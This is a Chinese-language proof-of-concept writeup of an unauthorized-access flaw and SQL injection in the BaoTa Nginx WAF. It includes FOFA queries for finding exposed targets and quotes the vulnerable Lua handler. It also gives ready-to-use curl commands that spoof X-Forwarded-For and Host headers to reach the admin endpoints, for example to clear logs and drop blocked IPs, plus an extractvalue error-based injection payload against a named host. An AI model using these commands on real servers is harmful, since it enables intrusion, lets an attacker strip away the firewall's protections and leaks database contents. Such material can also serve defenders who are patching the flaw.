## 宝塔最新未授权访问漏洞及sql注入

WAF 防火墙 (宝塔 Nginx 防火墙) 存在 SQL 注入漏洞和未授权漏洞

## fofa
```
title=='404 - Website not exist!'

"宝塔"
```

## 未授权

漏洞代码
```
start = function ()
 ... 此处身略若干行
 if ngx.var.remote_addr == "127.0.0.1" and ngx.ctx.Server_name == "127.0.0.251" and ngx.var.host == "127.0.0.251" then
  if ngx.var.uri == "/get_btwaf_drop_ip" then
   Public.return_message(200, uv0.get_btwaf_drop_ip())
  elseif ngx.var.uri == "/remove_btwaf_drop_ip" then
   Public.return_message(200, uv0.remove_btwaf_drop_ip())
  elseif ngx.var.uri == "/clean_btwaf_drop_ip" then
   Public.return_message(200, uv0.clean_btwaf_drop_ip())
  elseif ngx.var.uri == "/updateinfo" then
   Public.return_message(200, uv0.updateInfo())
  elseif ngx.var.uri == "/get_site_status" then
   Public.return_message(200, uv0.get_site_status())
  elseif ngx.var.uri == "/get_global_status" then
   Public.return_message(200, uv0.get_global_status())
  end

  if ngx.var.uri == "/clean_btwaf_logs" then
   Public.return_message(200, uv0.clean_btwaf_logs())
  end

  if ngx.var.uri == "/clear_speed_hit" then
   Public.return_message(200, uv0.clear_speed_hit())
  end

  if ngx.var.uri == "/clear_replace_hit" then
   Public.return_message(200, uv0.clear_replace_hit())
  end

  if ngx.var.uri == "/reset_customize_cc" then
   Public.return_message(200, uv0.reset_customize_cc())
  end

  if ngx.var.uri == "/clear_speed_countsize" then
   Public.return_message(200, uv0.clear_speed_countsize())
  end
 end
end
```
### 接口
```
curl 'http://宝塔地址/API'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'

```
## sql注入

```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```
![image](https://github.com/wy876/POC/assets/139549762/bbd89fb6-b9b7-4628-a33d-57fc7b8708e5)


## 漏洞来源
- https://mp.weixin.qq.com/s/7AqKcCS9puZgb9lG2KcAsg
- https://www.v2ex.com/t/1015932
